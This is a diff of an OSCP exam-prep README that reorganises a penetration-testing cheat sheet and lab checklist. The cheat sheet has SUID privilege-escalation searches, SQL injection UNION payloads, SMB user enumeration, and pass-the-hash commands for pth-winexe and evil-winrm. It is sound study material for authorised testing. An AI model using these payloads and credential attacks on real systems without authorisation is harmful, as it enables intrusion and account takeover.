@@ -1,28 +1,129 @@
 # OSCP-Prep-Guide
 A collection of labs, tools, and study materials for OSCP exam preparation. Includes practice environments, scripts, and resources for enumeration, exploitation, and privilege escalation to help master penetration testing skills.
 
-## Tool
+## Tool and Cheat Sheet
 
-### Enumeration
+### Linux Command
+Check user's sudo permissions
+```shell
+sudo -l
+```
+Find the file
+```shell
+find / -iname "flag.txt" 2>/dev/null
+```
+Find all SUID file
+```shell
+find / -perm -u=s -type f 2>/dev/null
+```
+Find all the SUID/SGID executables
+```bash
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+```
 
-- [enum4linux](https://www.kali.org/tools/enum4linux/): a tool for enumerating information from Windows and Samba systems
+### SQL injection
 
-### Privilege Escalation
+#### Database info discovery
+Version
+```shell
+# Microsoft or MySQL
+@@version 
+# PostgreSQL
+version()
+# SQLite
+sqlite_version()
+```
 
-- [GTFOBins](https://gtfobins.github.io/): list of Unix binaries which can escalate privileges
-- [Linpeas](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS): search for possible paths to escalate privileges on Linux
-- [Winpeas](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS): search for possible paths to escalate privileges on Windows
-- [Penelope](https://github.com/brightio/penelope): reverse shell
+Show Tables
+``` sql
+-- SQLite
+SELECT name FROM sqlite_master WHERE type = "table"
+```
+#### UNION attacks
+Example
+```sql
+SELECT a, b FROM table1 UNION SELECT c, d FROM table2
+```
+Determining the number of columns required
+```
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+etc. 
+```
+Finding columns with a useful data type
+```
+' UNION SELECT 'a',NULL,NULL,NULL--
+' UNION SELECT NULL,'a',NULL,NULL--
+' UNION SELECT NULL,NULL,'a',NULL--
+' UNION SELECT NULL,NULL,NULL,'a'--
+```
+### Scaning & Enumeration
 
-### Password Crack
+#### [Nmap](https://nmap.org/)
 
-- [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit/): A modified version of the passing-the-hash tool collection
-- [Hydra](https://www.kali.org/tools/hydra/): Hydra is a parallelized login cracker which supports numerous protocols to attack
-- [john the ripper](https://www.openwall.com/john/): John the Ripper is an Open Source password security auditing and password recovery tool available for many operating systems
+Enumerate the users on a remote Windows system
+```
+nmap --script smb-enum-users.nse -p445 <host>
+sudo nmap -sU -sS --script smb-enum-users.nse -p U:137,T:139 <host>
+```
 
-### Vulnerability Exploit
+#### [enum4linux](https://www.kali.org/tools/enum4linux/)
+a tool for enumerating information from Windows and Samba systems
 
-- [Metasploit](https://github.com/rapid7/metasploit-framework)
+### Gaining Access
+
+#### [GTFOBins](https://gtfobins.github.io/)
+list of Unix binaries which can escalate privileges
+#### [Linpeas](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
+search for possible paths to escalate privileges on Linux
+#### [Winpeas](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
+search for possible paths to escalate privileges on Windows
+#### [Metasploit](https://github.com/rapid7/metasploit-framework)
+#### [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit/)
+A modified version of the passing-the-hash tool collection
+
+pth-winexe
+```
+pth-winexe -U 'admin%password123' //10.10.119.24 cmd.exe
+```
+### Maintaining Access
+
+#### [xfreerdp](https://www.freerdp.com/)
+RDP on Linux
+
+enables clipboard, allows resize window, creates a shared drive between the attacking machine and the target
+```shell
+xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share
+```
+#### [Penelope](https://github.com/brightio/penelope)
+reverse shell
+
+#### [evil-winrm](https://github.com/Hackplayers/evil-winrm)
+The ultimate WinRM shell for hacking/pentesting
+
+```shell
+evil-winrm -u USERNAME -p PASSWORD -i TARGET_IP 
+```
+pass hash
+```shell
+evil-winrm -u Administrator -H ADMIN_HASH -i IP
+```
+
+### Brute-force
+
+#### [Hydra](https://www.kali.org/tools/hydra/)
+Hydra is a parallelized login cracker which supports numerous protocols to attack
+#### [john the ripper](https://www.openwall.com/john/)
+John the Ripper is an Open Source password security auditing and password recovery tool available for many operating systems
+
+### Other
+
+#### .ssh
+The keys need to be read-writable only by you:
+```
+chmod 600 ~/.ssh/id_rsa
+```
 
 ## Walkthrough Labs
 
@@ -62,7 +163,7 @@ A collection of labs, tools, and study materials for OSCP exam preparation. Incl
 - [X] [[Easy] Exploit Vulnerabilities](https://tryhackme.com/jr/exploitingavulnerabilityv2)
 - [X] [[Easy] Vulnerability Capstone](https://tryhackme.com/jr/vulnerabilitycapstone)
 - [X] [[Easy] Intro PoC Scripting](https://tryhackme.com/room/intropocscripting)
-- [ ] [[Easy] Wreath](https://tryhackme.com/room/wreath)
+- [X] [[Easy] Wreath](https://tryhackme.com/room/wreath)
 
 #### Windows Active Directory Attack
 - [ ] [Active Directory Basics](https://tryhackme.com/room/winadbasics)
@@ -263,85 +364,6 @@ A collection of labs, tools, and study materials for OSCP exam preparation. Incl
 #### Windows Active Directory
 
 #### Try Harder
-
-## Cheat Sheet
-
-### Linux Command
-Check user's sudo permissions
-```shell
-sudo -l
-```
-Find the file
-```shell
-find / -iname "flag.txt" 2>/dev/null
-```
-Find all SUID file
-```shell
-find / -perm -u=s -type f 2>/dev/null
-```
-Find all the SUID/SGID executables
-```bash
-find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
-```
-### Nmap
-
-Enumerate the users on a remote Windows system
-```
-nmap --script smb-enum-users.nse -p445 <host>
-sudo nmap -sU -sS --script smb-enum-users.nse -p U:137,T:139 <host>
-```
-
-
-### SQL injection
-
-#### Database info discovery
-Version
-```shell
-# Microsoft or MySQL
-@@version 
-# PostgreSQL
-version()
-# SQLite
-sqlite_version()
-```
-
-Show Tables
-``` sql
--- SQLite
-SELECT name FROM sqlite_master WHERE type = "table"
-```
-#### UNION attacks
-Example
-```sql
-SELECT a, b FROM table1 UNION SELECT c, d FROM table2
-```
-Determining the number of columns required
-```
-' UNION SELECT NULL--
-' UNION SELECT NULL,NULL--
-' UNION SELECT NULL,NULL,NULL--
-etc. 
-```
-Finding columns with a useful data type
-```
-' UNION SELECT 'a',NULL,NULL,NULL--
-' UNION SELECT NULL,'a',NULL,NULL--
-' UNION SELECT NULL,NULL,'a',NULL--
-' UNION SELECT NULL,NULL,NULL,'a'--
-```
-
-### Password Cracker
-
-#### .ssh
-The keys need to be read-writable only by you:
-```
-chmod 600 ~/.ssh/id_rsa
-```
-
-#### pth-winexe
-```
-pth-winexe -U 'admin%password123' //10.10.119.24 cmd.exe
-```
 
 ## Reference
 - https://github.com/rodolfomarianocy/OSCP-Tricks-2023
